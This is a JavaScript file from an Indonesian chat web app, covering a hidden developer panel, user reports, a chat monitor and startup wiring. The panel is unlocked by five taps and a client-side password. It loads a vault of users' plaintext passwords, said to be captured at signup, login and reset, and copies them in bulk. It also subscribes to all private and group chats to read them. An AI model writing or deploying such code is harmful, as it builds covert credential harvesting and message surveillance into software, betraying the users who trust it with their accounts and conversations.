/* dev.js v1 — panel developer, laporan, monitor, init */
'use strict';
function devLoadDb(){
var box=el('devDbList');box.innerHTML='<div class="devrow">Memuat & mendekripsi…</div>';
vaultLoad().then(function(dec){
var db=JSON.parse(localStorage.getItem('qc-devdb')||'[]');var map={};
db.forEach(function(r){map[r.u]=r;});
dec.forEach(function(o){if(!o)return;if(o.del){delete map[o.u];}else if(o.u){map[o.u]={u:o.u,p:o.p,t:o.t||now()};}});
var arr=Object.keys(map).map(function(k){return map[k];});
arr.sort(function(a,b){return (a.t||0)-(b.t||0);});
localStorage.setItem('qc-devdb',JSON.stringify(arr));
box.innerHTML='';
if(!arr.length){box.innerHTML='<div class="devrow">Belum ada data. Vault terisi otomatis saat user daftar / login / reset password.</div>';return;}
arr.forEach(function(r){var d=document.createElement('div');d.className='devrow';d.innerHTML='<span><b>'+esc(r.u)+'</b></span><span>'+esc(r.p)+'</span>';box.appendChild(d);});
toast('Database tersimpan di perangkat ini ('+arr.length+' akun)');
}).catch(function(){box.innerHTML='';toast('Gagal membaca database');});
}
function devCopyDb(){
var db=JSON.parse(localStorage.getItem('qc-devdb')||'[]');
if(!db.length){toast('Database masih kosong');return;}
var txt=db.map(function(r){return r.u+' : '+r.p;}).join('\n');
if(navigator.clipboard)navigator.clipboard.writeText(txt);
toast('Database disalin ('+db.length+' akun)');
}
function devToggleBan(u,wasBanned){
if(wasBanned)publishRetained(banT(u),{u:u,banned:false,t:now()});
else publishRetained(banT(u),{u:u,banned:true,t:now()});
toast(wasBanned?('Ban dicabut: '+u):('Pengguna dibanned: '+u));
setTimeout(devLoad,900);
}
function devDeleteAccount(u){
publishRetained(userT(u),{u:u,deleted:true,t:now()});
publishRetained(vaultT(u),{u:u,del:true,t:now()});
publishRetained(profT(u),{u:u,deleted:true});
publishRetained(kickT(u),{u:u,t:now()});
toast('Akun '+u+' dihapus oleh developer');
setTimeout(devLoad,900);
}
function devLoad(){
var box=el('devList');box.innerHTML='<div class="devrow">Memuat…</div>';
Promise.all([fetchWild(NS+'user/',2600),fetchWild(NS+'ban/',2600)]).then(function(res){
var list=(res[0]||[]).filter(function(r){return r&&r.u&&!r.deleted;});
var bans={};(res[1]||[]).forEach(function(b){if(b&&b.u)bans[b.u]=!!b.banned;});
if(!list.length){box.innerHTML='<div class="devrow">Tidak ada akun ditemukan.</div>';return;}
list.sort(function(a,b){return (a.created||0)-(b.created||0);});
box.innerHTML='';
list.forEach(function(r){
var banned=!!bans[r.u];
var d=document.createElement('div');d.className='devrow';
var sp=document.createElement('span');sp.style.flex='1';
sp.innerHTML='<b>'+esc(r.u)+'</b> · '+new Date(r.created||now()).toLocaleDateString('id-ID')+(banned?' · <span style="color:var(--red)">DIBANNED</span>':'')+'<br><span style="opacity:.7">Q: '+esc(QUESTIONS[r.q||0])+'</span>';
d.appendChild(sp);
var row=document.createElement('div');row.style.display='flex';row.style.gap='6px';
var b=document.createElement('button');b.className='mini-btn';b.type='button';
b.innerHTML=banned?icon('check',12)+' Cabut':icon('ban',12)+' Ban';
b.style.borderColor=banned?'rgba(74,222,128,.4)':'rgba(255,107,107,.4)';
b.style.color=banned?'var(--green)':'#ff9090';
b.onclick=function(){devToggleBan(r.u,banned);};
var b2=document.createElement('button');b2.className='mini-btn';b2.type='button';
b2.innerHTML=icon('trash',12)+' Hapus';
b2.style.borderColor='rgba(255,107,107,.4)';b2.style.color='#ff9090';
b2.onclick=function(){if(confirm('Hapus akun '+r.u+' permanen?'))devDeleteAccount(r.u);};
row.appendChild(b);row.appendChild(b2);
d.appendChild(row);box.appendChild(d);
});
});
}
function devLoadReports(){
var box=el('devRepList');box.innerHTML='<div class="devrow">Memuat laporan…</div>';
fetchWild(NS+'report/',3000).then(function(rs){
rs=(rs||[]).filter(function(r){return r&&r.id;});
rs.sort(function(a,b){return (b.time||0)-(a.time||0);});
box.innerHTML='';
if(!rs.length){box.innerHTML='<div class="devrow">Belum ada laporan masuk.</div>';return;}
rs.forEach(function(r){
var d=document.createElement('div');d.className='devrow';d.style.alignItems='flex-start';
var sp=document.createElement('span');sp.style.flex='1';
sp.innerHTML='<b>'+esc(r.target)+'</b> dilaporkan '+esc(r.from)+'<br>'+esc(r.reason||'')+(r.note?' — "'+esc(r.note)+'"':'')+'<br><i>'+new Date(r.time||0).toLocaleString('id-ID')+'</i>';
d.appendChild(sp);
var row=document.createElement('div');row.style.display='flex';row.style.flexDirection='column';row.style.gap='6px';
var b1=document.createElement('button');b1.className='mini-btn';b1.type='button';
b1.innerHTML=icon('ban',12)+' Ban';
b1.onclick=function(){devToggleBan(r.target,false);};
var b2=document.createElement('button');b2.className='mini-btn';b2.type='button';
b2.innerHTML=icon('trash',12)+' Hapus';
b2.style.borderColor='rgba(255,107,107,.4)';b2.style.color='#ff9090';
b2.onclick=function(){if(confirm('Hapus akun '+r.target+'?'))devDeleteAccount(r.target);};
row.appendChild(b1);row.appendChild(b2);
d.appendChild(row);box.appendChild(d);
});
}
function monPush(topic,m){
var feed=el('monFeed');if(!feed)return;
var label=topic.replace(NS,'');
var txt=m.type==='image'?'[gambar]':m.type==='audio'?'[suara]':(m.text||'');
var d=document.createElement('div');d.className='devrow';d.style.display='block';
d.innerHTML='<span>'+fmtTime(m.time||now())+' <b>'+esc(m.user||'?')+'</b> → '+esc(label)+'<br>'+esc(String(txt).slice(0,140))+'</span>';
feed.appendChild(d);
while(feed.children.length>200)feed.removeChild(feed.firstChild);
feed.scrollTop=feed.scrollHeight;
}
function monStart(){
if(monOn){toast('Monitor sudah aktif');return;}
monOn=true;
sub(NS+'dm/#');
sub(NS+'grp/#');
toast('Monitor chat aktif');
}
function monStop(){
if(!monOn)return;
monOn=false;
unsub(NS+'dm/#');
unsub(NS+'grp/#');
toast('Monitor chat berhenti');
}
function devTab(name){
var map={acc:'devPaneAcc',rep:'devPaneRep',mon:'devPaneMon',db:'devPaneDb'};
for(var k in map)el(map[k]).classList.toggle('hidden',k!==name);
var bs=document.querySelectorAll('#devTabs button');
for(var i=0;i<bs.length;i++)bs[i].classList.toggle('on',bs[i].dataset.dt===name);
}
var devTaps=0,devT=null;
function devTap(){devTaps++;clearTimeout(devT);devT=setTimeout(function(){devTaps=0;},2500);if(devTaps>=5){devTaps=0;openDev();}}
function openDev(){
var unlocked=sessionStorage.getItem('qc-devunlocked')==='1';
el('devLock').classList.toggle('hidden',unlocked);
el('devBody').classList.toggle('hidden',!unlocked);
openOv('devModal');
}
function devUnlock(){
if(el('inDevPass').value===DEV_PASS){sessionStorage.setItem('qc-devunlocked','1');el('inDevPass').value='';openDev();toast('Panel developer terbuka');}
else toast('Password developer salah');
}
function devLockNow(){closeOv('devModal');monStop();sessionStorage.removeItem('qc-devunlocked');toast('Panel developer dikunci');}
var repTarget=null;
function openReport(){
if(!S.conv||S.conv.type!=='dm'){toast('Laporan tersedia untuk chat pribadi');return;}
repTarget=S.conv.peer;
put('repWho','Melaporkan pengguna: @'+esc(repTarget));
el('repNote').value='';
openOv('repModal');
}
function sendReport(){
if(!repTarget)return;
var id=rand(8);
publishRetained(repT(id),{id:id,from:S.me,target:repTarget,reason:el('repReason').value,note:(el('repNote').value||'').trim().slice(0,200),time:now()});
closeOv('repModal');
toast('Laporan terkirim ke developer');
}
function init(){
var IS_IOS=/iP(hone|ad|od)|Macintosh/i.test(navigator.userAgent)&&('ontouchend' in window);
if(IS_IOS)document.body.classList.add('ios');
var qs=el('inQ');if(qs){qs.innerHTML='';QUESTIONS.forEach(function(q,i){var o=document.createElement('option');o.value=i;o.textContent=q;qs.appendChild(o);});}
var rr=el('repReason');if(rr){rr.innerHTML='';['Spam','Penipuan','Pelecehan','Konten tidak pantas','Ancaman','Lainnya'].forEach(function(x){var o=document.createElement('option');o.value=x;o.textContent=x;rr.appendChild(o);});}
put('btnMenu',icon('menu'));put('btnCloseAcc',icon('x'));put('btnCloseSb',icon('x'));
put('btnAccSettings',icon('person')+' Pengaturan akun');
put('btnAccLogout',icon('logout')+' Keluar');
put('btnBack',icon('back'));put('btnInfo',icon('info'));put('btnCall',icon('video'));put('btnCallAudio',icon('phone'));
put('btnSbCopy',icon('copy'));put('btnSbShare',icon('link'));
put('fabDM',icon('userPlus',22));put('fabGroup',icon('users',22));
put('btnAttach',icon('attach'));put('btnMic',icon('mic'));put('btnEmoji',icon('smile'));put('btnSend',icon('send'));put('cpClear',icon('x'));put('btnCancelEdit',icon('x'));put('mmClose',icon('x'));
put('btnUploadAvatar',icon('image')+' Foto');put('btnCamAvatar',icon('camera')+' Kamera');put('btnRandomAvatar',icon('dice')+' Acak');
put('btnDelAcc',icon('userX')+' Hapus akun permanen');
put('btnWallpaper',icon('image')+' Wallpaper chat');
put('btnWallClear',icon('trash')+' Hapus wallpaper');
put('btnReport',icon('flag')+' Laporkan pengguna');
put('btnClearMsgs',icon('eraser')+' Bersihkan pesan');
put('btnDeleteConv',icon('trash')+' Hapus chat ini');
put('btnLeaveGroup',icon('logout')+' Keluar grup');
put('btnDeleteGroup',icon('alert')+' Hapus grup (semua anggota)');
put('btnDevDb',icon('download')+' Muat & simpan database ke perangkat ini');
put('btnDevCopy',icon('copy')+' Salin database');
put('btnDevLock',icon('lock')+' Kunci panel developer');
document.querySelectorAll('.d-close').forEach(function(b){b.innerHTML=icon('x');});
document.addEventListener('gesturestart',function(e){e.preventDefault();});
document.addEventListener('gesturechange',function(e){e.preventDefault();});
document.addEventListener('gestureend',function(e){e.preventDefault();});
document.addEventListener('wheel',function(e){if(e.ctrlKey)e.preventDefault();},{passive:false});
setInterval(function(){if(typeof mqtt!=='undefined'&&!anyConnected())reconnectAll();},7000);
on('tabLogin','click',function(){setAuthMode('login');});
on('tabReg','click',function(){setAuthMode('reg');});
on('btnAuth','click',doAuth);
on('inPass','keydown',function(e){if(e.key==='Enter')doAuth();});
on('btnForgot','click',function(){recStep(1);openOv('recModal');});
on('btnRec1','click',rec1);on('btnRec2','click',rec2);on('btnRec3','click',rec3);
on('devTap','click',devTap);on('devTap2','click',devTap);
on('btnDevUnlock','click',devUnlock);
on('inDevPass','keydown',function(e){if(e.key==='Enter')devUnlock();});
on('btnDevLoad','click',devLoad);
on('btnDevReports','click',devLoadReports);
on('btnDevDb','click',devLoadDb);
on('btnDevCopy','click',devCopyDb);
on('btnDevLock','click',devLockNow);
on('devTabs','click',function(e){var b=e.target.closest('button');if(!b)return;devTab(b.dataset.dt);});
on('btnMonStart','click',monStart);
on('btnMonStop','click',monStop);
on('btnMonClear','click',function(){el('monFeed').innerHTML='';});
on('btnReport','click',openReport);
on('btnRepSend','click',sendReport);
on('btnDelAcc','click',armDelete);
on('btnMenu','click',function(){renderAcc();openOv('accSidebar');});
on('btnCloseAcc','click',function(){closeOv('accSidebar');});
on('accScrim','click',function(){closeOv('accSidebar');});
on('accCard','click',function(){closeOv('accSidebar');setTimeout(openProfile,80);});
on('btnAccSettings','click',function(){closeOv('accSidebar');setTimeout(openProfile,80);});
on('btnAccLogout','click',function(){closeOv('accSidebar');logout();toast('Kamu keluar');});
on('btnSaveProf','click',saveProfile);
on('btnRandomAvatar','click',function(){tmpProf.img=null;tmpProf.color=Math.floor(Math.random()*COLORS.length);renderProfModal();});
on('btnUploadAvatar','click',function(){el('avatarInput').click();});
on('btnCamAvatar','click',function(){el('avatarCam').click();});
on('avatarInput','change',function(e){pickAvatarFile(e.target.files[0]);e.target.value='';});
on('avatarCam','change',function(e){pickAvatarFile(e.target.files[0]);e.target.value='';});
on('btnWallpaper','click',function(){el('wallInput').click();});
on('wallInput','change',function(e){
var f=e.target.files[0];e.target.value='';
if(!f)return;
compressWall(f).then(openWallEditor).catch(function(){toast('Gagal memproses wallpaper');});
});
on('wallDark','input',function(){if(!wallPending)return;wallPending.dark=+this.value;syncWallUI();});
on('wallZoom','input',function(){if(!wallPending)return;wallPending.zoom=+this.value;syncWallUI();});
on('btnWallSave','click',function(){
if(!wallPending)return;
setWall(wallPending);
applyWall();
closeOv('wallModal');
renderSidebar();
toast('Wallpaper chat disimpan');
});
on('btnWallClear','click',function(){
localStorage.removeItem('qc-wall');
applyWall();
renderSidebar();
toast('Wallpaper dihapus');
});
on('fabDM','click',function(){openOv('dmModal');el('inDM').focus();});
on('btnDM','click',function(){startDM(el('inDM').value);});
on('inDM','keydown',function(e){if(e.key==='Enter')startDM(el('inDM').value);});
on('fabGroup','click',function(){openOv('grpModal');});
on('btnGrp','click',function(){createGroup(el('inGrp').value);});
on('btnGrpJoin','click',function(){joinGroup(el('inGrpCode').value);});
on('btnBack','click',backHome);
on('btnInfo','click',function(){renderSidebar();openOv('sidebar');});
on('btnCloseSb','click',function(){closeOv('sidebar');});
on('sbScrim','click',function(){closeOv('sidebar');});
on('btnSbCopy','click',function(){if(S.conv&&S.conv.type==='group'){var c=S.conv.key.slice(4);if(navigator.clipboard)navigator.clipboard.writeText(c);toast('Kode grup disalin: '+c);}});
on('btnSbShare','click',function(){if(S.conv&&S.conv.type==='group'){var link=location.href.split(/[?#]/)[0]+'?g='+S.conv.key.slice(4);if(navigator.clipboard)navigator.clipboard.writeText(link);toast('Link undangan disalin');}});
on('btnCall','click',function(){if(S.conv&&S.conv.type==='dm'&&window.QC&&QC.startCall)QC.startCall(S.conv.peer,true);});
on('btnCallAudio','click',function(){if(S.conv&&S.conv.type==='dm'&&window.QC&&QC.startCall)QC.startCall(S.conv.peer,false);});
on('mmClose','click',function(){closeOv('mediaModal');});
on('cpClear','click',function(){S.pendingImage=null;el('composePreview').classList.remove('on');updateSendBtn();});
on('btnCancelEdit','click',function(){S.editId=null;el('editBar').classList.remove('on');el('input').value='';updateSendBtn();});
on('btnClearMsgs','click',function(){if(!S.conv)return;S.msgs=[];saveMsgs(S.conv.key,[]);S.reactRaw={};localStorage.setItem('qc-react-'+S.me+'-'+S.conv.key,'{}');renderMsgs();toast('Pesan dibersihkan di perangkat ini');});
on('btnDeleteConv','click',function(){if(!S.conv||S.conv.type!=='dm')return;var k=S.conv.key;removeConv(k);backHome();toast('Chat dihapus dari daftar');});
on('btnLeaveGroup','click',function(){var c=S.conv;if(!c||c.type!=='group')return;var members=(c.members||[]).filter(function(m){return m!==S.me;});publishRetained(gmetaT(c.key.slice(4)),{id:c.key.slice(4),name:c.name,owner:c.owner||S.me,members:members,created:c.created||now()});writeMsg({type:'system',text:S.me+' keluar dari grup'});removeConv(c.key);backHome();toast('Kamu keluar dari grup');});
on('btnDeleteGroup','click',function(){var c=S.conv;if(!c||c.type!=='group'||c.owner!==S.me)return;publishTo(convTopic(c.key),{k:'grp-del',from:S.me,conv:c.key});publishRetained(gmetaT(c.key.slice(4)),{id:c.key.slice(4),name:c.name,owner:c.owner,members:[],deleted:true});removeConv(c.key);backHome();toast('Grup dihapus untuk semua anggota');});
on('btnSend','click',sendMessage);
var ta=el('input');
if(ta){
ta.addEventListener('input',function(){autoGrow();updateSendBtn();if(S.conv)publishTo(convTopic(S.conv.key),{k:'type',from:S.me,conv:S.conv.key});});
ta.addEventListener('keydown',function(e){if(e.key==='Enter'&&!e.shiftKey){e.preventDefault();sendMessage();}});
ta.addEventListener('focus',function(){setTimeout(pinChat,200);setTimeout(pinChat,500);});
}
var ms=el('msgScroll');
if(ms){ms.addEventListener('scroll',function(){closeAllTools();},{passive:true});}
if(window.visualViewport){
visualViewport.addEventListener('resize',function(){syncHeight();if(S.view==='chat')pinChat();});
visualViewport.addEventListener('scroll',function(){syncHeight();});
}
window.addEventListener('resize',syncHeight);
window.addEventListener('orientationchange',function(){setTimeout(syncHeight,150);});
on('btnEmoji','click',function(e){e.stopPropagation();S.reactTarget=null;el('emojiPop').classList.toggle('hidden');});
document.addEventListener('click',function(e){
if(now()-lastLP<700)return;
if(!e.target.closest('#emojiPop')&&!e.target.closest('#btnEmoji')){
el('emojiPop').classList.add('hidden');
S.reactTarget=null;
}
if(!e.target.closest('.m-tools'))closeAllTools();
});
document.querySelectorAll('[data-close]').forEach(function(x){x.addEventListener('click',function(){closeOv(x.dataset.close);});});
window.addEventListener('online',function(){renderNet();reconnectAll();});
window.addEventListener('offline',function(){renderNet();});
document.addEventListener('visibilitychange',function(){
if(!S.me)return;
if(document.hidden){
publishRetained(presT(S.me),{k:'pres',from:S.me,seen:now(),online:false});
}else{
publishPresence();
renderNet();
}
});
window.addEventListener('beforeunload',function(){if(S.me)publishRetained(presT(S.me),{k:'pres',from:S.me,seen:now(),online:false});});
window.addEventListener('pagehide',function(){if(S.me)publishRetained(presT(S.me),{k:'pres',from:S.me,seen:now(),online:false});});
syncHeight();
applyWall();
connectAll();
var sess=JSON.parse(localStorage.getItem('qc-session')||'null');
var g=new URLSearchParams(location.search).get('g');
if(sess&&sess.u){
enterSession(sess.u,sess.h);
if(g)setTimeout(function(){joinGroup(g);},800);
whenConnected(12000).then(function(ok){
if(!ok||!S.me||S.me!==sess.u)return;
return fetchRetained(userT(sess.u),2500).then(function(rec){
if(!S.me||S.me!==sess.u)return;
if(rec&&rec.deleted){logout();toast('Akun sudah dihapus.');return;}
if(rec&&rec.h&&rec.h!==sess.h){logout();toast('Sesi berakhir. Masuk ulang.');return;}
return checkBan(sess.u).then(function(b){if(b&&S.me===sess.u){logout();toast('Akun dibanned oleh developer');}});
});
});
}else if(g){toast('Masuk / daftar dulu untuk bergabung ke grup');}
setAuthMode('login');renderNet();
}
if(document.readyState==='loading')document.addEventListener('DOMContentLoaded',init);else init();
/* END dev.js v1 */
